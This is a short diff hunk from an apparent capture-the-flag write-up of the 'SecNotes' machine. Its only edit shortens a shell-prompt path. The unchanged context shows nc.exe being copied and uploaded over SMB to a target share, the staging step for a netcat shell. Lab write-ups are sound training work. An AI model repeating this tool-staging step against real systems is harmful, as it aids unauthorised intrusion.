@@ -133,7 +133,7 @@ Upload nc.exe
 ```
 └─#  cp /usr/share/windows-resources/binaries/nc.exe .                                                                         1 ⚙
                                                                                                                                    
-┌──(root💀kali)-[~/…/TJNull2.0/Windows/secnotes/exploitation]
+┌──(root💀kali)-[~/…/secnotes/exploitation]
 └─# fg                                                                                                                         1 ⚙
 [1]  + continued  smbclient -H \\\\10.10.10.97\\new-site -U tyler
 put nc.exe 
